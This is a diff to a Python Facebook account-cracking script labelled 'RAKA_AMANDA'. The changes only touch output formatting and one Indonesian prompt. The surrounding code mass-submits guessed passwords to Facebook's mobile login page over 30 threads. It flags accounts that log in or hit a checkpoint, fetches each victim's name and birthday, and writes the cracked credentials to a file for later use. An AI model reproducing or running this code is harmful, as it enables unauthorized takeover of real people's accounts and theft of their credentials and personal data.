@@ -256,9 +256,9 @@ def crack():
 				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': rax_x, 'pass': pw, 'login': 'submit'}, headers={'user-agent': raka_ua})
 				xo = rex.content
 				if 'mbasic_logout_button' in xo or 'save-device' in xo:
-					print('\r  \x1b[1;92m[RAKA_AMANDA OK] '+str(rax_x)+'|'+str(pw)+'       ')
-					ok.append(rax_x+'|'+pw)
-					save.write('[RAKA_AMANDA OK] '+str(rax_x)+'|'+str(pw)+'\n')
+					print('\r  \x1b[1;92m[RAKA_AMANDA OK] '+str(rax_x)+' | '+str(pw)+'       ')
+					ok.append(rax_x+' | '+pw)
+					save.write('[RAKA_AMANDA OK] '+str(rax_x)+' | '+str(pw)+'\n')
 					save.close()
 					break
 					continue
@@ -269,17 +269,17 @@ def crack():
 						data = s.get(url).json()
 						tgllhr = data['birthday'].replace("/","-")
 						nama = data['name']
-						print('  \r\x1b[1;96m [RAKA_AMANDA CP] ' +rax_x+ '|' + pw + ' <-> ' + tgllhr)
-						cp.append(rax_x+' <-> '+pw+' <-> '+tgllhr)
-						save.write('[RAKA_AMANDA CP] '+str(rax_x)+' <-> '+str(pw)+' <-> '+tgllhr+'\n')
+						print('  \r\x1b[1;96m [RAKA_AMANDA CP] ' +rax_x+ '|' + pw + ' | ' + tgllhr)
+						cp.append(rax_x+' | '+pw+' | '+tgllhr)
+						save.write('[RAKA_AMANDA CP] '+str(rax_x)+' | '+str(pw)+' | '+tgllhr+'\n')
 						save.close()
 						break
 					except(KeyError, IOError):
 						tgllhr = " "
 					except:pass
-					print('  \r\x1b[1;96m [RAKA_AMANDA CP] ' +rax_x+ ' <-> ' + pw + '       ')
-					cp.append(rax_x+'|'+pw)
-					save.write('[RAKA_AMANDA CP] '+str(rax_x)+' <-> '+str(pw)+'\n')
+					print('  \r\x1b[1;96m [RAKA_AMANDA CP] ' +rax_x+ ' | ' + pw + '       ')
+					cp.append(rax_x+' | '+pw)
+					save.write('[RAKA_AMANDA CP] '+str(rax_x)+' | '+str(pw)+'\n')
 					save.close()
 					break
 					continue
@@ -289,7 +289,7 @@ def crack():
 			pass
 	p = ThreadPool(30)
 	p.map(main, id)
-        jalan(' \n[\x1b[1;92m-\x1b[1;97m] Copy paste Hasil Crack Dan Simpan Selama \x1b[1;92m2 \x1b[1;97mHari ...? ');time.sleep(1)
+        jalan(' \n[\x1b[1;92m-\x1b[1;97m] Copy paste Hasil Crack Dan Simpan Selama \x1b[1;92m6 \x1b[1;97mHari ...? ');time.sleep(1)
 	exit(' \n[\x1b[1;92m!\x1b[1;97m] Finished ... ')
 
 if __name__ == '__main__':
